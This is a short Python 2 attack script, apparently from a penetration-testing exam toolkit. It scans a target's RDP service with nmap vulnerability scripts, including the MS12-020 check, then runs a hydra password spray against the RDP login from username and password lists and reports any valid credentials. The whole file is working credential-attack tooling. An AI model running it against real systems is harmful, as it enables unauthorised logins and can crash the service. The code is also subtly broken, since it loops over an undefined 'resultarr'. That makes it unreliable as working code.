#!/usr/bin/env python
import subprocess
import sys
import os

if len(sys.argv) != 3:
    print "Usage: rdprecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

#NSE Script documentation
#RUNNING
#rdp-enum-encryption: determines which Security layer and Encryption level is supported by RDP service
#rdp-vuln-ms12-020: checks for CVE-2012-0002 by checking for CVE-2012-0152 (DoS). Checks without crashing, but could still potentially crash.
print "INFO: Performing nmap RDP script scan for %s:%s" % (ip_address, port)
#RDPSCAN = "nmap -n -sV -Pn -vv -p %s --script=rdp-enum-encryption,rdp-vuln-ms12-020,vulners -oA '/root/scripts/recon_enum/results/exam/rdp/%s_rdp.nmap' %s" % (port, ip_address, ip_address)
#results = subprocess.check_output(RDPSCAN, shell=True)
subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=rdp-enum-encryption,rdp-vuln-ms12-020,vulners','-oA','/root/scripts/recon_enum/results/exam/rdp/%s_%s_rdp' % (ip_address,port),ip_address])

#Default Hydra configuration with a small username and password list
#This configuration is meant to spray, not to brute. Manually configure a
#Brute scan if desired.
print "INFO: Performing hydra rdp scan against %s. This will take a LONG time" % (ip_address)
#HYDRA = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/rdp/%s_rdphydra.txt -u %s -s %s rdp" % (ip_address, ip_address, port)
try:
    #results = subprocess.check_output(HYDRA, shell=True)
    #resultarr = results.split("\n")
    results = subprocess.check_output(['hydra','-L','/root/lists/userlist.txt','-P','/root/lists/quick_password_spray.txt','-f','-o','/root/scripts/recon_enum/results/exam/rdp/%s_%s_rdphydra.txt' % (ip_address,port),'-t','4','-u',ip_address,'-s',port,'rdp']).split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[*] Valid rdp credentials found: %s" % (result)
except subprocess.CalledProcessError as hydrerr:
    if hydrerr.returncode == 255:
        print "Hydra broke early with status 255, it must have found something! Check rdphydra for output."
    elif hydrerr.returncode != 0:
        print "Hydra broke:"
        print hydrerr.returncode
        print hydrerr.output
    else:
        print "INFO: No valid rdp credentials found"
# outfile = "/root/scripts/recon_enum/results/exam/rdp/%s_rdprecon.txt" % (ip_address)
# f = open(outfile, "w")
# f.write(results)
# f.close
